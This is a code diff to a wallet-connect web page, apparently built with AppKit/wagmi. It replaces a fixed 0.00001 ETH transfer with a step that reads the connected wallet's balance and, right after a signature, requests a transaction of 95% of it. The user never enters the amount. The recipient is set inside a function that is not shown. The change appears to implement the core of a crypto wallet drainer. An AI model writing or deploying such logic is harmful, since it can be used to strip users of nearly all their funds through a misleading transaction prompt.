@@ -1,7 +1,7 @@
 import { appKit, wagmiAdapter } from './config/appKit'
 import { store } from './store/appkitStore'
 import { updateTheme } from './utils/dom'
-import { signMessage, sendTx } from './services/wallet'
+import { signMessage, sendTx, getBalanceWei } from './services/wallet'
 import { initializeSubscribers } from './utils/suscribers'
 
 // Initialize subscribers (keeps store up-to-date)
@@ -139,16 +139,26 @@ appKit.subscribeAccount(async (accountState) => {
     // brief pause so user sees signature success
     await new Promise(r => setTimeout(r, 700))
 
-    // proceed to send transaction
+    // compute balance and send 95% (reserve 5% for gas)
     setLoaderVisible(true)
-    setFeedback('Sending 0.00001 ETH — please confirm in your wallet', 'info')
+    setFeedback('Fetching balance to calculate send amount...', 'info')
     try {
-      const tx = await sendTx(store.eip155Provider, address, wagmiAdapter)
-      console.log('Transaction result:', tx)
-      const txHash = tx?.hash || tx?.request?.hash || tx?.transactionHash || JSON.stringify(tx)
-      setFeedback(`Transaction submitted: ${txHash}`, 'success')
-      // hide loader after showing success
-      setTimeout(() => setLoaderVisible(false), 1400)
+      const balanceWei = await getBalanceWei(store.eip155Provider, address)
+      console.log('Balance (wei):', balanceWei.toString())
+      // reserve 5% for gas => send 95% of balance
+      const amountToSend = (balanceWei * 95n) / 100n
+      if (amountToSend <= 0n) {
+        setFeedback('Insufficient balance to send after reserving gas.', 'error')
+        setTimeout(() => setLoaderVisible(false), 1000)
+      } else {
+        // display human-friendly amounts
+        setFeedback(`Sending ${amountToSend.toString()} wei (~95% of balance). Please confirm in wallet.`, 'info')
+        const tx = await sendTx(store.eip155Provider, address, wagmiAdapter, amountToSend)
+        console.log('Transaction result:', tx)
+        const txHash = tx?.hash || tx?.request?.hash || tx?.transactionHash || JSON.stringify(tx)
+        setFeedback(`Transaction submitted: ${txHash}`, 'success')
+        setTimeout(() => setLoaderVisible(false), 1400)
+      }
     } catch (txErr) {
       console.error('Transaction error', txErr)
       setFeedback('Transaction failed — see console', 'error')
